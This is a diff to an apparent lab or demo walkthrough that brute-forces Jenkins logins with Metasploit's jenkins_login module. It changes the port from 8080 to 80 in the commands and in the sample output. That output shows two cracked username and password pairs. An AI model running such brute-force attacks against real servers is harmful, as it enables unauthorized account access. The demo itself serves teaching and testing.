@@ -56,7 +56,7 @@ msfconsole
 
 use auxiliary/scanner/http/jenkins_login
 set RHOSTS jenkins.test.nevervictimconsult.xyz
-set RPORT 8080
+set RPORT 80
 set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
 set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
 set LOGIN_URL j_spring_security_check
@@ -67,6 +67,6 @@ exploit
 There will be two successful attempts
 
 ```bash
-[+] 34.159.77.191:8080 - Login Successful: Robert.Bartsch:!@#$%1234pacr1234!@#$%
-[+] 34.159.77.191:8080 - Login Successful: Jeffrey_van_d_Linden:!@#$%67890QAZwsxh
+[+] 34.159.77.191:80 - Login Successful: Robert.Bartsch:!@#$%1234pacr1234!@#$%
+[+] 34.159.77.191:80 - Login Successful: Jeffrey_van_d_Linden:!@#$%67890QAZwsxh
 ```
